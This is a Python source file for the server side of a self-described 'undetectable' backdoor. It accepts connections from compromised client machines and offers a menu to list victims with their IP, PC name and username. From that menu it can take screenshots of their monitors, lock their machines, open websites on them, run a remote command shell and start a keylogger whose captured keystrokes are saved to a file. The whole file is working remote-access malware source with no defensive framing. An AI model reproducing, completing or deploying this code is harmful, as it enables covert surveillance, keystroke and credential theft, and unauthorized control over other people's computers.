""" Yakuza Backdoor, Undetectable, Server Side
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/8/2024 | 18 aban 1403.
End Developing Date:

"""

# Step 0: Import requires libraries

from queue import Queue
# import socket
from socket import socket, SOL_SOCKET, SO_REUSEADDR, error as SocketError
from time import sleep, strftime
from threading import Thread
from os import path


from miscs.colors import fColors, bColors
from miscs.string_format import StringFormat

""" Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """

# Step 2: Define Global Variables

intThreads = 2  # Thread's Number in Multithreading
arrJobs = [1, 2]  # Use for Multithreading, Store Total Jobs

queue = Queue()  # Used for Handling Jobs in Multithreading

arrAddresses = []  # Store All Socket Connection Addresses
arrConnections = []  # Store All Connection Information about Socket Connections

# TODO: for testing change SERVER_HOST to Kali WSL IP Address
# SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
SERVER_PORT = 4444  # Server Port

intBuff = 1024  # Maximum Size(Bytes) of Data to Receive as

# objSocket = None      # Socket Object


# Step 3: Define Global lambda's
decode_utf8 = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace('\"', '')

# Define Center Alignment Lambda
center = lambda string, title: f"{{:^{len(string)}}}".format(title) # noqa

# noinspection PyUnresolvedReferences
send = lambda data: conn.send(data)
# noinspection PyUnresolvedReferences
recv = lambda buffer: conn.recv(buffer)

# Step 4: Define a Function to Receive a Large Amount of Data
def recvall(buffer):
    bytesData = b''

    while True:
        bytePart = recv(buffer)

        if len(bytePart) == buffer:
            return bytePart

        bytesData += bytePart

        if len(bytesData) == buffer:
            return bytesData


# Step 5: Define a Function to Create Socket Connection
def create_socket():
    global objSocket # noqa
    try:
        objSocket = socket()
        objSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    except SocketError as e:
        print(f'{fColors.LIGHT_RED}[-] Error while Creating Socket. \n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')


# Step 6: Define a Function to Bind Socket
def socket_bind():
    global objSocket  # noqa
    try:
        print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
              "\n[***] Welcome to YAKUZA BACKDOOR SERVER Side.! [***]\n" + fColors.RESET)

        print(fColors.GREEN + f"\n[+] Listening on Port: {str(SERVER_PORT)}" + fColors.RESET)
        objSocket.bind((SERVER_HOST, SERVER_PORT))  # noqa
        objSocket.listen(20)

    except SocketError as e:
        print(f'{fColors.LIGHT_RED}[-] Error while Binding Socket. \n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
        socket_bind()
        #we can use socket_bind() without using loop


# Step 7: Define Function to Accept Socket
def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()

            # Set no timeout blocking
            conn.setblocking(1)  # noqa

            # Append Connection to arrConnections
            arrConnections.append(conn)

            # Get Client info and add it to address
            clientInfo = decode_utf8(conn.recv(intBuff)).split("',")
            address += clientInfo[0], clientInfo[1], clientInfo[2]

            # Append address to arrAddresses
            arrAddresses.append(address)

            # address[0] is IP Address, address[2] is Client PC Information
            print(fColors.LIGHT_GREEN +
                  f"\n[+] Connection has been Succesfully Established: {address[0]} ({address[2]})" + fColors.RESET)

        except SocketError as e:
            print(f'{fColors.LIGHT_RED}[-] Error while Accepting Connection. '
                  f'\n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
            continue


# Step 12: Define a Function to Show Help Menu
def menu_help():
    print(fColors.LIGHT_BLUE+ "\nMain Menu Options:")
    print(fColors.LIGHT_WHITE+"""
    ---------
    --l, list: Connect to Server
    --i [CONNECTION-ID]: Interact with Connections
    
    --help, help: Show Help Menu
    --x, exit: Disconnect from Server
    
    """ + fColors.RESET)

# this function used to show All Commands list
def commands_help():
    print(fColors.LIGHT_BLUE+ "\nCommands List Help Menu:")
    print(fColors.LIGHT_WHITE+"""
    ---------
    ---------: Built-In Commands:---------
    --m [MESSAGE]: Send Message to the Client
    --o [WEBSITE_URL]: Open Website on the Client Machine
    --p: Take Screenshot from All Monitors
    --p 1: Take Screenshot from Primary Monitor
    --x, exit: Terminate Connection, Close Backdoor on the Client
    --x 1: Lock Client Machine
    
    --help, help: Show Help Menu
    goback: From Command Menu Go Back to Main Menu 
    
    ---------: Command Prompt Mode :---------
    --e: Switch to Command Prompt Mode
    goback: From Command Prompt Mode Go Back to Main Menu 
    

    
    
    """ + fColors.RESET)


# Step 13: Define a Function for Main Menu
# in the Main Menu only Main Commands(--l, --i [ID],--h ,--x) are available.
# Other commands define in send_commands() function
def main_menu():
    while True:
        # Get Command from User input
        strChoice = input(fColors.LIGHT_YELLOW + "\n[Main Menu]$>> " + fColors.RESET)

        # --l or list: Command to List Available Connections
        if strChoice == '--l' or strChoice == 'list':
            list_connections()

        # --i [CONNECTION-ID]: Command for Interact(Select) with Connections
        elif strChoice[:3] == '--i' and len(strChoice) > 3:
            # Select Connection and store it into global variable in name `conn`
            conn = select_connection(strChoice[4:], 'True')

            # if conn is not, None send commands to the client
            if conn is not None:
                send_commands()

        # --h or help: Command for Show Help Menu
        elif strChoice == '--h' or strChoice == 'help':
            menu_help()
            main_menu()

        # --x or exit: Command for Close Server, Client and Connection
        elif strChoice == '--x' or strChoice == 'exit':
            close()
            exit(1)

        # Invalid Choice
        else:
            print(fColors.LIGHT_RED + "[-] Invalid Choice, Please Try Again" + fColors.RESET)
            menu_help()
            main_menu()     # or continue


# Step 14: Define a Function to Close Connection and Application
def close():
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:
        return

    for intCounter, conn in enumerate(arrConnections):
        conn.send(b'exit')
        # conn.send(str.encode('exit'))
        conn.close()

    del arrConnections; arrConnections = []
    del arrAddresses; arrAddresses = []


# Step 16: Define a Function to List All Connections
def list_connections():
    if len(arrConnections) > 0:
        strClients = ''

        for intCounter, conn in enumerate(arrConnections):

            strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
                str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                str(arrAddresses[intCounter][3]) + "\n"

        print(fColors.LIGHT_BLUE + "\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " + \
              center(str(arrAddresses[0][1]), "PORT") + 4*" " + \
              center(str(arrAddresses[0][2]), "PC Name") + 4*" " + \
              center(str(arrAddresses[0][3]), "OS Name") + "\n" + \
              fColors.LIGHT_WHITE +strClients  + fColors.RESET, end="")
    else:
        print(fColors.LIGHT_RED + "[-] No Connections Found!!." + fColors.RESET)


# Step 17: Define `select_connection()` Function to Select a Connection
def select_connection(connection_id, get_response):
    global conn, arrInfo, selectedID # noqa
    try:
        connection_id = int(connection_id)
        selectedID = connection_id
        conn = arrConnections[connection_id]

    except: print(fColors.LIGHT_RED+"[-] Invalid Choice! Please Try Again."  + fColors.RESET); return # noqa

    # if any error not happens, fill arrInfo by User Information
    else:
        # arrInfo = [IP, PORT, OS, User] from Client
        arrInfo = (str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]),
                   str(arrAddresses[connection_id][3]), str(arrAddresses[connection_id][4]))
        #arrAddresses[connection_id][0] is Client IP Address
		#arrAddresses[connection_id][2] is Client PORT
		#arrAddresses[connection_id][3] is Client OS Name
		#arrAddresses[connection_id][4] is Client Username
		#arrAddresses[connection_id][1] is Client PC Info

        # Check if the get_response is True show Connected message to the user
        if get_response == 'True':
            print(fColors.LIGHT_GREEN + f"[+] You Are Connect to {arrInfo[0]}\n" + fColors.RESET)

        return conn


# Step 28: Define & Complete `screenshot()` Function on the Server
def screenshot(all_monitors=True):

    # Set primary or All Monitor Screenshot-taking
    if all_monitors:
        send(b'screen')
    else:
        send(b'prscreen')

    # send(str.encode('screen'))

    # Get Screenshot Info and Print it
    strClientResponse = decode_utf8(recv(intBuff))
    print(f"\n{strClientResponse}")

    # Used for receive all bytes of screenshot completely
    intBuffer = ''

    for counter in range(0, len(strClientResponse)):

        # Get out the size of screenshot from strClientResponse and add it to intBuffer
        if strClientResponse[counter].isdigit():
            intBuffer += strClientResponse[counter]

    intBuffer = int(intBuffer)

    # Create filename from Date for screenshot
    strFile = arrInfo[1] + '.' + arrInfo[3]  + '_' + strftime("%Y%m%d-%H%M%S" + ".png")

    # Receive Screenshot bytes from the Client
    screenData = recvall(intBuffer)

    # Try to save screenshot to file
    try:
        # Open new file(strFile) and write screenshot to it
        with open(strFile, 'wb') as pic:
            pic.write(screenData)

        # Notify User that Screenshot Saved succesfully
        print(f"[+] Screenshot Saved.\n[+] Total bytes received: {str(path.getsize(strFile))} bytes.")

    except Exception as e:
        print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")

# Step 33: Define `command_shell()` Function to 1. Receive Prompt, 2. Send Command, 3. Receive Command Output
def command_shell():
    send(b'cmd')

    receiveOne = decode_utf8(recv(intBuff))

    # First Receive: Receive Prompt from the Client
    strDefault = '\n' + receiveOne + '$>> '
    print(strDefault, end='')

    # 1. Give Command from user, 2. Send Command to the Client, 3. Receive Command Output from the Client
    while True:
        # 1. Give Command from the user
        strCommand = input('')

        # 2. Send Command to the Client
        # Send 'goback' to the client to close the Command Prompt and Back to the Command Mode(menu)
        # if strCommand == 'quit' or strCommand == 'exit':
        #     send(b'goback')

        if strCommand == 'goback':
            send(b'back')
            receiveTwo = decode_utf8(recv(intBuff))

            if receiveTwo == 'closed':
                print(fColors.LIGHT_RED + "[-] Command Prompt Closed." + fColors.RESET)
                return main_menu()

            # strCommand = ''
            # strDefault = ''
            # # send_commands()
            # main_menu()

        # we can't use the 'cmd' Command in the Command prompt, so we should check it
        elif strCommand == 'cmd':
            print(fColors.LIGHT_RED +
                  "[-] You Can't Use Command Prompt in the Command Prompt, Don't Use 'cmd' Command" + fColors.RESET)


        # elif len(str(strCommand)) > 0 Mean Command Submit and should send to the Client
        elif len(str(strCommand)) > 0:
            send(str.encode(strCommand))

            # Step 36: Complete `command_shell()` to Receive Stdout+stderr on the Backdoor Server
            # 3. Receive Command Output(stdout+stderr) from the Client

            # First Receive len of stdout+stderr
            intBuffer = int(decode_utf8(recv(intBuff)))


            # Then Receive stdout+stderr completely
            strClientResponse = decode_utf8(recvall(intBuffer))

            # Print results of executed command on the Client machine
            print(strClientResponse, end='')

        # else, Mean command is empty, so print default prompt
        else:
            print(strDefault, end='')

def keylogger():
    # First Receive len of logged keys
    firstRecv = decode_utf8(recv(intBuff))

    resultLen = intBuff
    loggedKeys = ''

    if firstRecv.startswith('len'):
        resultLen = int(firstRecv.split(' ')[1])

        if resultLen == 0:
            print(f"{fColors.LIGHT_RED}[-] No Keys Logged.")
            return send_commands()
        else:
            # Scond Receive logged keys
            loggedKeys = decode_utf8(recvall(resultLen))

            # if loggedKeys.startswith('@keys@'):
            clientInfo = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
            loggedKeys = loggedKeys.replace('@keys@' , f'Logged Keys from {clientInfo}: \n')

            print(f"{fColors.GREEN}\n[+] Key Logging Stopped. All Logged keys saved into 'keylog.txt' file. "
                  f"Logged Keys:\n{fColors.LIGHT_WHITE}{loggedKeys}")

    # Write Result to the file
    with open('keylog.txt', 'a') as f:
        f.write("\n----------\n\n----------\n" + loggedKeys)

        # Third Receive Key Logoff Message
        keyLogOff = decode_utf8(recv(intBuff))
        print(f"{fColors.LIGHT_RED}\n\n {keyLogOff}{fColors.RESET}")

        # for key in loggedKeys:
        #     f.write(key)
        #     # f.write(" ".join(key))


# Step 19: Define `send_commands()` Function to Send Commands to the Client
# All Commands except Main Menu Commands should define in this function

def send_commands():
    while True:
        prompt = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
        strChoice = input(f"{fColors.LIGHT_YELLOW}{prompt}$>> {fColors.RESET}")

        #--m [MESSAGE]: Command for Send Message to Client
        if strChoice[:3] == '--m' and len(strChoice) > 3:
            strMsg= 'msg' + strChoice[3:]
            send(str.encode(strMsg))

        # --o [WEBSITE_URL]: Command for Open Website on the Backdoor Client
        elif strChoice[:3] == '--o' and len(strChoice) > 3:
            strSite = 'site' + strChoice[4:]
            send(str.encode(strSite))

        # --p: Used for taking screenshot from all screens on the Client
        elif strChoice == '--p' or strChoice == 'screenshot':
            screenshot()

        # --p 1: Used for taking screenshot from only Primary screen on the Client
        elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
            screenshot(all_monitors=False)

        # --x 1: Used for Locking the Client Machine
        elif strChoice == '--x 1' or strChoice == 'lock':
            send(b'lock')

        # --e: Used for Hijacking Client Command Prompt
        elif strChoice[:3] == '--e':
            command_shell()

        # TODO: Own Implementation
        # --h, See Commands List Help Menu
        elif strChoice == '--h' or strChoice == 'help':
            commands_help()
            continue

        # --k 1: Used to Start Key Logger on the Client
        elif strChoice == '--k 1' or strChoice == 'keylog on':
            send(b'keylogon')
            print(decode_utf8(recv(intBuff)))

        elif strChoice == '--k 0' or strChoice == 'keylog off':
            send(b'keylogoff')
            keylogger()





        # --x or exit: Command for Close Server, Client and Connection in Command MODE
        elif strChoice == '--x' or strChoice == 'exit':
            close()
            exit(1)

        elif strChoice == 'goback':
            return main_menu()




""" Note: All Function should write before this section"""
""" Last Section of Backdoor Server: Implement Multithreading """
# Step 9: Define a Function to Create Threads and run work() Multithreading
def create_threads():
    for _ in range(intThreads):
        objThread = Thread(target=work)
        objThread.daemon = True
        objThread.start()

    queue.join()


# Step 10: Define a Function to Create Jobs
def create_jobs():
    for intThreads in arrJobs:
        queue.put(intThreads)

    queue.join()


# Step 8: Define the Main Job Function, which use as a Thread in Multithreading
def work():
    while True:
        intValue = queue.get()

        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()

        elif intValue == 2:
            while True:
                sleep(20)

                if len(arrAddresses) > 0:
                    # Write main_menu() in next steps
                    main_menu()
                    break

        queue.task_done()
        queue.task_done()
        exit(0)

# This functions should call in the Last Line, Call Function's to Run the app on Multithreading
create_threads()
create_jobs()




















